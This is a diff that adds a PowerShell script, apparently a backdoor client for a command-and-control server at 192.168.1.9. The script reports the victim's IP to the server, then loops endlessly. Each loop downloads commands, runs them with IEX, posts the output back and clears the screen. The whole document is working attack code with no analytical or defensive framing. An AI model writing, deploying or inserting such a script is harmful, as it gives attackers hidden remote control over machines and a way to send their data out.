@@ -1,0 +1,30 @@
+$ser="http://192.168.1.9"
+$ip=(New-Object Net.Webclient).downloadstring("http://ip-api.com/json/24.48.0.1?fields=query")
+$ip=(New-Object Net.Webclient).downloadstring($ser+"/json.php?ip="+$ip)
+$url1=$ser+"/online/"+$ip
+$url2=$ser+"/?mod=2&id="+$ip
+$url3=$ser+"/?mod=1&id="+$ip
+$s3n5e_pas="s3n5e="
+
+function Main
+{
+    $tmp=(New-Object Net.Webclient).downloadstring($url1)
+    if ($tmp -eq "0")
+    {
+        Start-Sleep -Milliseconds 5000
+        main
+    }
+    s3n5e
+}
+function s3n5e
+{
+    $shell= IEX (New-Object Net.Webclient).downloadstring($url1)
+    $shell=$shell| Out-String
+    $data = $s3n5e_pas+$shell
+    Invoke-WebRequest -Uri $url2  -ContentType 'application/x-www-form-urlencoded;charset=UTF-8' -Method Post -Body $data
+    (New-Object Net.Webclient).downloadstring($url3)
+    cls
+    Start-Sleep -Milliseconds 1500
+    Main
+}
+main
